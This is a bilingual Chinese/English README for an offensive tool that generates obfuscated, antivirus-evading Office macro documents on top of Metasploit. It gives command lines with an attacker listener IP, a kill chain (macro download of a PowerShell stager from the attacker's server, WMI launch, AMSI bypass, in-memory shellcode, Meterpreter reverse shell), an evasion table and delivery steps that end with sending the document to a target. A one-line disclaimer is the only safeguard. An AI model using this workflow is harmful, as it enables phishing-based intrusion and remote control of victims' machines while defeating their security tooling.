# MacroForge

一款基于 Metasploit 的混淆 VBA 宏 Payload 自动生成器，用于授权渗透测试。一条命令生成分阶段免杀 Office 宏文档，支持 Windows 和 Kali Linux。

An obfuscated VBA macro payload generator built on Metasploit for authorized pentesting. One command to produce staged, AV-evasive Office macro documents. Works on both Windows and Kali Linux.

## Features 功能

- **Caesar 密码混淆** — 所有敏感字符串编码存储，每次 shift 值随机，绕过静态签名检测
- **随机化标识符** — 函数名、变量名、临时文件名全部随机生成，每次输出不同
- **WMI 执行** — 通过 `Win32_Process.Create` 启动 PowerShell，断开 Word→PS 父子进程链，绕过 EDR
- **AMSI 绕过** — 载荷执行前自动 patch AMSI，禁用 PowerShell 内存扫描
- **分阶段投递** — 文档本身不含 shellcode，仅有混淆下载器；真正的载荷托管在攻击机 HTTP 上
- **跨平台** — Windows 和 Kali 自动检测 Metasploit 路径
- **多种载荷** — `reverse_tcp` / `reverse_https` / `reverse_http` / `shell_tcp`，支持 x86 和 x64

## Requirements 环境

- Python 3.6+
- Metasploit Framework（自动检测路径）

## Quick Start 快速开始

```bash
# 默认生成全套 (x64, reverse_tcp, 端口 4444)
python MacroForge.py --lhost 10.10.16.7

# 生成后自动开 HTTP 服务 (默认 8080)
python MacroForge.py --lhost 10.10.16.7 --serve

# 指定 HTTP 端口
python MacroForge.py --lhost 10.10.16.7 --serve 8081

# 一键全自动：生成 + HTTP + msfconsole 监听
python MacroForge.py --lhost 10.10.16.7 --serve --listen
```

## Usage 用法

```
python MacroForge.py --lhost <IP> [options]

必填:
  --lhost          监听 IP

可选:
  --lport          监听端口 (默认 4444)
  --http-port      HTTP 分发端口 (默认 8080)
  --arch           目标架构 x86|x64 (默认 x64)
  --payload        载荷类型 (默认 reverse_tcp)
                     reverse_tcp | reverse_https | reverse_http | shell_tcp
  --msf-path       Metasploit 路径 (默认自动检测)
  --output-dir     输出目录 (默认当前目录)
  --shift          Caesar 偏移量 1-5 (默认随机)
  --serve [PORT]   生成后自动启动 HTTP 服务 (可选端口，如 --serve 8081)
  --listen         自动启动 msfconsole 监听 (配合 --serve)
```

## Examples 示例

```bash
python MacroForge.py --lhost 10.10.16.7 --payload reverse_https --lport 443
python MacroForge.py --lhost 10.10.16.7 --arch x86 --shift 3
python MacroForge.py --lhost 10.10.16.7 --output-dir ./output
python MacroForge.py --lhost 10.10.16.7 --msf-path /opt/metasploit-framework
```

## Output 输出文件

| 文件 | 说明 |
|------|------|
| `macro.vba` | 混淆 VBA 宏，粘贴到 Word 模块即可 |
| `rev.ps1` | 含 AMSI 绕过的 PowerShell 载荷，放在 HTTP 服务上 |
| `handler.rc` | Metasploit 资源文件，`msfconsole -r handler.rc` 一键监听 |

## Steps 操作步骤

1. **生成载荷** — `python MacroForge.py --lhost 10.10.16.7`
2. **开 HTTP** — `python -m http.server 8080`
3. **开监听** — `msfconsole -r handler.rc`
4. **做文档** — Word → `Alt+F11` → 插入模块 → 粘贴 `macro.vba` → 存为 `.doc`/`.docm`
5. **投递** — 发送文档给目标

## Kill Chain 攻击链

```
目标打开 Word → 宏触发 → Caesar 解码后 XMLHTTP 下载 rev.ps1
→ 随机文件名写入 %TEMP% → WMI 启动 PowerShell（父进程为 WMI 非 Word）
→ AMSI bypass → shellcode 内存注入 → Meterpreter 反弹到攻击机
```

## Evasion 免杀总结

| 层级 | 技术 |
|------|------|
| 文档层 | 无 shellcode，仅含混淆下载器 |
| 字符串层 | 随机偏移 Caesar 密码编码 |
| 标识符层 | 函数名/变量名每次随机 |
| 执行层 | WMI 创建进程，断开父子链 |
| PS 层 | 执行前 AMSI bypass |
| 载荷层 | 内存注入，无文件落地 |

## Disclaimer 免责声明

本工具仅用于授权渗透测试和安全教育。未经授权对非自有系统使用属于违法行为。
This tool is for authorized penetration testing only. Unauthorized use is illegal.
